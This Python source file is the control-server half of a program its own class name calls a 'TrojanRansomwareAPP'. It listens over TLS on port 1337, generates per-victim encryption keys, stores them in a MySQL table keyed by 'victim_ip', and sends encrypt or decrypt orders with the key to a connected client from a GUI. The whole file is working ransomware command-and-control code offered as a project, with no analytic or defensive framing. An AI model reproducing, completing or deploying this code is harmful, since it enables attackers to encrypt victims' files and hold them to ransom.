import os
import ssl
import json
import socket
import base64
import secrets
import threading
import tkinter as tk
from tkinter import messagebox
from mysql.connector import connect



class TrojanRansomwareAPP:
    '''
    A class that creates an interface to the server with buttons for selecting an action - encryption or decryption.
    After selecting the action, a message is sent when the action is completed.
    '''
    def __init__(self, gui, ip, client_sock):
        self.client_sock = client_sock
        self.ip = ip
        self.gui = gui
        self.gui.title("Files encryption and decryption system")
        self.gui.geometry("1600x900")
        self.gui.configure(bg = 'white')

        # Create an encryption button
        self.encrypt_button = tk.Button(gui, text = "Encrypt Folder" ,width = 30, height = 8, font = ('Courier', 16), fg = "white",
                        activebackground = "purple", bg = "pink", command = self.encrypt_folder)
        self.encrypt_button.place(x = 240, y = 500)

        # Create a decryption button
        self.decrypt_button = tk.Button(gui, text = "Decrypt Folder" ,width = 30, height = 8, font = ('Courier', 16), fg = "white",
                        activebackground = "purple", bg = "pink", command = self.decrypt_folder)
        self.decrypt_button.place(x = 870, y = 500)
    

    def encrypt_folder(self):
        '''
        The function generates a secret key, stores it in a mysql database, and sends it and the operation type to the client.
        '''
        secret_key = secrets.token_bytes(32)
        # Encrypting the key in base 64
        secret_key = base64.b64encode(secret_key).decode('utf-8')
        # Saving the key in a MySQL database table
        save_key_to_db(self.ip, secret_key)
        data = {'action': 'encrypt', 'secret_key': secret_key}
        # Convert dictionary to string with JSON
        data = json.dumps(data)
        self.client_sock.sendall(data.encode('utf-8'))


    def decrypt_folder(self):
        '''
        The function takes the value of the secret key from the database, and sends it and the operation type to the client.
        '''
        # Obtaining the key from the database
        try:
            key = get_key_from_db(self.ip)
        except:
            print("no key got")
        data = {'action': 'decrypt', 'secret_key': key}
        # Convert dictionary to string with JSON
        data = json.dumps(data)
        self.client_sock.sendall(data.encode('utf-8'))
    

    def Update_message(self):
        '''
        The function receives a notification about the operation (whether it was performed successfully or not).
        '''
        while True:
            data = self.client_sock.recv(4096).decode('utf-8')
            # If no data was received
            if not data:
                break
            # Pop-up notification of the action being performed on the screen
            messagebox.showwarning("Message",data)



def setup_db():
    '''
    Create the database and table in it in MySQL if it has not already been created.
    '''
    with connect(host = "localhost", user = 'root', password = os.getenv("MYSQLPASS")) as connection:
        with connection.cursor() as cursor:
            cursor.execute("CREATE DATABASE IF NOT EXISTS keys_tracking")
            cursor.execute("USE keys_tracking")
            cursor.execute('CREATE TABLE IF NOT EXISTS keys_tracking_table (victim_ip VARCHAR(45) UNIQUE,secret_key VARCHAR(64))')
        # Save changes
        connection.commit()


def save_key_to_db(ip: str, key: str):
    '''
    The function is responsible for saving the client's key and IP in the table and if the IP is already
    found then changing the value of the secret key.
    '''
    with connect(host = "localhost", user = 'root', password = os.getenv("MYSQLPASS"), database = 'keys_tracking') as connection:
        add_row = 'INSERT INTO keys_tracking_table (victim_ip, secret_key) VALUES (%s, %s) ON DUPLICATE KEY UPDATE secret_key = VALUES(secret_key)'
        val = (ip, key)
        with connection.cursor() as cursor:
            cursor.execute(add_row, val)
        # Save changes
        connection.commit()


def get_key_from_db(ip: str) -> str:
    '''
    The function is responsible for obtaining the key value from the table according to the client's IP.
    '''
    with connect(host = "localhost", user = 'root', password = os.getenv("MYSQLPASS"), database = 'keys_tracking') as connection:
        get_row = "SELECT secret_key FROM keys_tracking_table WHERE victim_ip = %s"
        val = (ip,)
        with connection.cursor() as cursor:
            cursor.execute(get_row, val)
            # Returns the row in the table according to what is defined in the condition
            result = cursor.fetchone()
            if not result:
                raise ValueError(f"No key found for IP: {ip}")
            return result[0]
    
          
def create_server(ip, port):
    '''
    Create a server socket that will listen for client connections.
    '''
    # Creating a foundation for building a secure server application in Python that can communicate via TLS/SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Loading a certificate chain and its corresponding private key into an SSLContext object
    context.load_cert_chain(certfile = "C://Users//Doron//server.pem", keyfile = "C://Users//Doron//server.key")
    # Creates a socket object for the server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port)) # Define the IP + Port for the server
    server_socket.listen(5) # Define maximum amount ot connections waiting to be accepted
    print(f"Server listening on {ip}:{port}")
    return server_socket, context


def accept_client(server_socket, context):
    '''
    Accepts an incoming connection request from a client.
    '''
    client_socket, client_address = server_socket.accept()  
    # Wrapping a standard network socket in a TLS/SSL layer, effectively converting it into a secure socket for server-side communication
    tls_conn = context.wrap_socket(client_socket, server_side = True)
    print(f"Accepted client: {client_address}")  
    return tls_conn, client_address[0]



if __name__ == "__main__":

    # Creating the server and confirming client connection
    server_socket, context = create_server('0.0.0.0', 1337)
    client_sock, client_ip = accept_client(server_socket, context)

    # Creating the database and table
    setup_db()

    # Creating the gui
    gui = tk.Tk()
    app = TrojanRansomwareAPP(gui, client_ip, client_sock)

    # Creating a thread that will run in parallel with the GUI and pop up notifications about the execution of the operation
    threading.Thread(target = app.Update_message, daemon = True).start()

    # Running the gui
    gui.mainloop()